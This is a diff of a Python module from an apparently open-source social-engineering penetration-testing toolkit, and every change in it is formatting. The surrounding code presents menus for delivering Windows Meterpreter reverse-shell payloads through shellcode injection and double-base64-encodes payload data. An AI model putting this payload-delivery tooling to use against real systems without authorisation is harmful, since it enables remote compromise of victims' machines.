@@ -78,9 +78,9 @@ payloadgen = "regular"
 if os.path.isfile(setdir + "/payloadgen"):
     payloadgen = "solo"
 
-##########################################################################
+#
 # grab ipaddr if it hasn't been identified yet
-##########################################################################
+#
 
 if check_options("IPADDR=") == False:
     fileopen = open("/etc/setoolkit/set.config", "r")
@@ -136,9 +136,9 @@ try:
 
     # if we don't trigger on the standard core api call
     if choice1 == "":
-        ###################################################
-        #        USER INPUT: SHOW PAYLOAD MENU 1          #
-        ###################################################
+        #
+        # USER INPUT: SHOW PAYLOAD MENU 1          #
+        #
         debug_msg(me, "printing 'text.payload_menu_1'", 5)
         show_payload_menu1 = create_menu(payload_menu_1_text, payload_menu_1)
         choice1 = raw_input(setprompt(["4"], ""))
@@ -311,14 +311,15 @@ try:
                 # if we are using shellcodeexec
                 if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
-                        print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
+                        print (
+                            "\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
                         # select payload
                         choice9 = raw_input(
                             setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_https]"))
                         # select default meterpreter reverse tcp
                         if choice9 == "":
-			    choice9 = "windows/meterpreter/reverse_https"
-			if choice9 == "1":
+                            choice9 = "windows/meterpreter/reverse_https"
+                        if choice9 == "1":
                             choice9 = "windows/meterpreter/reverse_tcp"
                         # select reverse https
                         if choice9 == "2":
@@ -361,7 +362,8 @@ try:
                         while 1:
 
                             if choice1 == "shellcode/multipyinject":
-                                print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
+                                print (
+                                    "\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                 choice9 = raw_input(
                                     setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                                 # select default meterpreter reverse tcp
@@ -485,7 +487,7 @@ try:
                     data = fileopen.read()
                     if payloadgen != "solo":
                         # base64 1
-			data = str(data)
+                        data = str(data)
                         data = base64.b64encode(data)
                         # encode it again for the fun 2
                         data = base64.b64encode(data)
